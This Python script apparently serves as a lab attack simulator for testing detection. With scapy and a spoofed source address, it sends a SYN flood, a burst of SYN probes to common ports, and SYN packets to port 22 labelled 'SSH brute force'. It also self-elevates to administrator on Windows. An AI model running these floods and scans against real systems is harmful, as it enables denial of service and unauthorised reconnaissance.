from scapy.layers.inet import IP, TCP
from scapy.all import send
import time
import random
import os
import sys
import ctypes

class AttackSimulator:
    def __init__(self, target_ip="192.168.1.3", attacker_ip="192.168.1.200"):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip

    def simulate_dos_attack(self, duration=10):
        print(f"[*] Starting DoS (SYN Flood) attack for {duration} seconds...")
        end_time = time.time() + duration
        while time.time() < end_time:
            sport = random.randint(1024, 65535)
            pkt = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=80, flags="S")
            send(pkt, verbose=False)
            time.sleep(0.05)

    def simulate_port_scan(self, ports=None):
        ports = ports or [22, 80, 443, 445, 3389]
        print(f"[*] Scanning ports: {ports}")
        for port in ports:
            pkt = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            send(pkt, verbose=False)
            time.sleep(0.2)

    def simulate_bruteforce_ssh(self, duration=10):
        print(f"[*] Simulating SSH brute force for {duration} seconds...")
        end_time = time.time() + duration
        while time.time() < end_time:
            pkt = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=random.randint(1024, 65535), dport=22, flags="S")
            send(pkt, verbose=False)
            time.sleep(0.3)

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    print("[*] Elevating privileges...")
    script = sys.argv[0]
    params = " ".join([script] + sys.argv[1:])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
    sys.exit()

def main():
    simulator = AttackSimulator()

    while True:
        print("\nChoose an attack:")
        print("1. DoS Attack (SYN Flood)")
        print("2. Port Scan")
        print("3. SSH Brute Force")
        print("4. All Attacks")
        print("5. Exit")
        choice = input("Choice: ")

        if choice == "1":
            simulator.simulate_dos_attack()
        elif choice == "2":
            simulator.simulate_port_scan()
        elif choice == "3":
            simulator.simulate_bruteforce_ssh()
        elif choice == "4":
            simulator.simulate_dos_attack(duration=5)
            simulator.simulate_port_scan()
            simulator.simulate_bruteforce_ssh(duration=5)
        elif choice == "5":
            break
        else:
            print("[!] Invalid choice.")

if __name__ == "__main__":
    if os.name == "nt":
        run_as_admin()
    else:
        if os.geteuid() != 0:
            print("[!] Please run as root")
            sys.exit(1)
    main()
